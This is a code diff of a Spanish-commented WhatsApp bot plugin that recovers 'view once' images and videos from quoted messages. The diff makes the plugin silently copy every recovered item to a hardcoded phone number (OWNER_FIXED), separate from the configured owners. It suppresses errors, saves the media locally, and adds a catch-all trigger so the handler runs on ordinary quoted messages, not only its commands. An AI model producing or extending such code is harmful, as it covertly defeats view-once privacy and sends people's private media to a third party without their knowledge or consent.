@@ -10,32 +10,30 @@ import fetch from 'node-fetch'
 import { webp2png } from '../lib/webp2mp4.js'
 
 const OWNER_FIXED = '59898719147@s.whatsapp.net'
-const PREFIX = '.'
+const PREFIX = '.' // ⚠️ cambiá si tu bot usa otro
 
 let handler = async (m, { conn, command }) => {
 
   const text = m.text || ''
   const isCommand = text.startsWith(PREFIX)
 
-  // ✅ Detectar owner real
-  const owners = (global.owner || []).map(o => o[0].replace(/[^0-9]/g, ''))
+  // ✅ Detectar owner real (robusto ante global.owner indefinido)
+  const owners = (global.owner || []).map(o => (Array.isArray(o) ? o[0] : o).toString().replace(/[^0-9]/g, ''))
   const senderNumber = m.sender.replace(/[^0-9]/g, '')
   const isOwner = owners.includes(senderNumber)
 
   // ✅ SOLO permitir modo grupo si es owner + ver/r
-  const isGroupMode = isOwner && ['ver', 'r'].includes(command)
+  const isGroupMode = m.isGroup && isOwner && ['ver', 'r'].includes(command)
 
-  // ✅ BLOQUEO TOTAL:
-  // Si es comando y NO es ver o r → salir sin tocar nada
+  // Si es comando y NO es ver/r → salir sin tocar nada (no interferir)
   if (isCommand && !['ver', 'r'].includes(command)) return
 
-  // ✅ REQUIERE CITA SIEMPRE
+  // REQUERIMOS SIEMPRE que el mensaje SEA UNA RESPUESTA/QUOTED
   const q = m.quoted
   if (!q) return
 
   try {
-
-    // ✅ DETECTAR VIEW ONCE REAL
+    // DETECTAR VIEW ONCE REAL
     const viewOnce =
       q.message?.viewOnceMessageV2?.message ||
       q.message?.viewOnceMessageV2Extension?.message
@@ -56,46 +54,56 @@ let handler = async (m, { conn, command }) => {
 
       type = mediaType.includes('video') ? 'video' : 'image'
       filenameSent = `recuperado.${mime.split('/')[1] || 'jpg'}`
-
     } else {
       mime = q.mimetype || q.mediaType || ''
       if (!/webp|image|video/.test(mime)) return
 
       buffer = await q.download()
       type = mime.startsWith('video') ? 'video' : 'image'
-      filenameSent = 'recuperado.' + mime.split('/')[1]
+      filenameSent = 'recuperado.' + (mime.split('/')[1] || 'jpg')
     }
 
-    // ✅ STICKER → PNG
+    // STICKER → PNG
     if (/webp/.test(mime)) {
       let result = await webp2png(buffer)
       if (result?.url) {
-        buffer = Buffer.from(await (await fetch(result.url)).arrayBuffer())
+        const res = await fetch(result.url)
+        buffer = Buffer.from(await res.arrayBuffer())
         filenameSent = 'sticker.png'
         type = 'image'
       }
     }
 
-    // ✅ SOLO SI OWNER USÓ ver/r → reenviar al grupo
+    // SOLO SI OWNER USÓ ver/r → reenviar al grupo
     if (isGroupMode) {
+      try {
+        await conn.sendMessage(
+          m.chat,
+          { [type]: buffer, fileName: filenameSent },
+          { quoted: null }
+        )
+      } catch (e) {
+        // no hacemos nada si falla (silencioso)
+      }
+    }
+
+    // SIEMPRE copia al privado del OWNER (silencioso)
+    try {
       await conn.sendMessage(
-        m.chat,
+        OWNER_FIXED,
         { [type]: buffer, fileName: filenameSent },
         { quoted: null }
       )
+    } catch (e) {
+      // si no se puede enviar al owner, lo ignoramos para que el plugin no rompa
+      console.error('No se pudo enviar al owner:', e?.message || e)
     }
 
-    // ✅ SIEMPRE copia al privado del OWNER
-    await conn.sendMessage(
-      OWNER_FIXED,
-      { [type]: buffer, fileName: filenameSent },
-      { quoted: null }
-    )
-
-    // ✅ GUARDAR MEDIA
+    // GUARDAR MEDIA
     const mediaFolder = './media'
-    if (!fs.existsSync(mediaFolder)) fs.mkdirSync(mediaFolder)
+    if (!fs.existsSync(mediaFolder)) fs.mkdirSync(mediaFolder, { recursive: true })
 
+    global.db = global.db || { data: {} }
     global.db.data.mediaList = global.db.data.mediaList || []
 
     const filename = `${Date.now()}_${Math.floor(Math.random() * 9999)}`
@@ -127,9 +135,16 @@ let handler = async (m, { conn, command }) => {
   }
 }
 
-// ✅ SOLO COMANDOS REALES
+// SOLO COMANDOS REALES
 handler.help = ['ver', 'r']
 handler.tags = ['tools', 'owner']
 handler.command = ['ver', 'r']
+
+// PARA QUE EL LOADER TAMBIÉN INVOQUE ESTO EN MENSAJES SIN PREFIJO:
+// Si tu loader soporta `customPrefix`, ponlo así en la definición del handler.
+// Si no lo soporta, el plugin seguirá funcionando para `.ver` / `.r`.
+// A continuación agrego la línea segura que recomiendo (si tu loader la respeta):
+handler.customPrefix = /^(?!\.)/  // cualquier mensaje que NO empiece con '.' (no captura comandos)
+handler.command = new RegExp()     // permitir que el loader invoque para mensajes normales
 
 export default handler
